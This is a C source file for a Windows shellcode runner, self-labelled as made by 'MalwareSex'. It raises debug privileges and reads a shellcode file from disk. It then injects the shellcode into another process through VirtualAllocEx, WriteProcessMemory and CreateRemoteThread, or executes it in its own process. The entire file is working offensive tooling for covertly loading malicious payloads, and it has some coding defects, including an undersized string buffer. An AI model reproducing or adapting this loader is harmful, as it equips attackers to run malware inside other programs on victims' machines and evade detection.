#define _CRT_SECURE_NO_DEPRECATE
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

int EnableDebugPriv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return 0;

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
		return 0;

	if (!CloseHandle(hToken))
		return 0;
	return 1;
}

DWORD GetProcessID(char* name)
{
	PROCESSENTRY32 entry;
	DWORD pId = 0;
	HANDLE snapshot;
	wchar_t* wcPName;

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	entry.dwSize = sizeof(PROCESSENTRY32);

	wcPName = (wchar_t*)malloc(strlen(name) + 1);
	swprintf(wcPName, strlen(name) + 1, L"%hs", name);

	if (Process32First(snapshot, &entry))
	{
		do
		{
			//printf("%S\n", entry.szExeFile);
			if (wcscmp(entry.szExeFile, wcPName) == 0)
			{
				pId = entry.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &entry));
	}
	CloseHandle(snapshot);

	return pId;
}

int main(int argc, char** argv)
{
	SetConsoleTitleA("ShellcodeRunner - Created by MalwareSex");
	if (argc < 2)
	{
		printf("Usage: %s <path of shellcode> [PID or ProcessName].\n", argv[0]);
		return 1;
	}

	if (!EnableDebugPriv())
	{
		printf("EnableDebugPriv failed.\n");
		return 1;
	}

	DWORD pId;
	char processName[MAX_PATH];
	char* shellcode;
	DWORD dwLen;
	pId = 0;

	if (argc == 3)
	{
		int valid = TRUE;

		strcpy_s(processName, MAX_PATH, argv[2]);
		for (size_t i = 0; i < strlen(processName); i++)
		{
			if (!isdigit(processName[i]))
			{
				valid = FALSE;
				break;
			}
		}

		if (valid)
		{
			pId = atoi(processName);
		}
		else
		{
			if ((pId = GetProcessID(processName)) == 0)
			{
				printf("The process \"%s\" doesn't exist.\n", processName);
				return 1;
			}
		}
	}

	printf("Opening %s...\n", argv[1]);
	FILE *f = fopen(argv[1], "r");
	if (!f)
	{
		printf("The file %s doesn't exist.\n", argv[1]);
		return 1;
	}
	fseek(f, 0, SEEK_END);
	dwLen = ftell(f) + 1;
	fseek(f, 0, SEEK_SET);

	shellcode = (char*)malloc(dwLen);
	size_t size;
	if ((size = fread(shellcode, sizeof(char), dwLen, f)) == 0)
	{
		printf("Error reading %s.\n", argv[1]);
		fclose(f);
		return 1;
	}
	shellcode[size] = '\0';
	fclose(f);

	if (pId)
	{
		HANDLE hProc, hMem;
		DWORD dwOldProtect;
		if ((hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, pId)) == 0)
		{
			printf("OpenProcess failed.\n");
			free(shellcode);
			return 1;
		}

		if ((hMem = VirtualAllocEx(hProc, NULL, dwLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == 0)
		{
			printf("VirtualAllocEx failed.");
			CloseHandle(hProc);
			free(shellcode);
			return 1;
		}

		if (!WriteProcessMemory(hProc, hMem, shellcode, dwLen, NULL))
		{
			printf("WriteProcessMemory failed.\n");
			CloseHandle(hProc);
			free(shellcode);
			return 1;
		}

		if (!VirtualProtectEx(hProc, hMem, dwLen, PAGE_EXECUTE_READ, &dwOldProtect))
		{
			printf("VirtualProtectEx failed.\n");
			CloseHandle(hProc);
			free(shellcode);
			return 1;
		}

		if (!CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hMem, NULL, 0, 0))
		{
			printf("CreateRemoteThread failed.\n");
			CloseHandle(hProc);
			free(shellcode);
			return 1;
		}

		printf("Shellcode injected:\n");
		printf("	-Size: %d\n", dwLen);
		printf("	-ProcessID: %d\n", pId);
		printf("	-Address: 0x%p\n", hMem);
		VirtualFreeEx(hProc, hMem, dwLen, MEM_RELEASE);
	}
	else
	{
		LPVOID lpAddress;
		if ((lpAddress = VirtualAlloc(NULL, dwLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == 0)
		{
			printf("VirtualAlloc failed.\n");
			free(shellcode);
			return 1;
		}
		memcpy(lpAddress, shellcode, dwLen);
		printf("Shellcode injected:\n");
		printf("	-Size: %d\n", dwLen);
		printf("	-ProcessID: %d\n", GetCurrentProcessId());
		printf("	-Address: 0x%p\n", lpAddress);
		((void(*)())lpAddress)();
		VirtualFree(lpAddress, dwLen, MEM_RELEASE);
	}
	free(shellcode);
	return 0;
}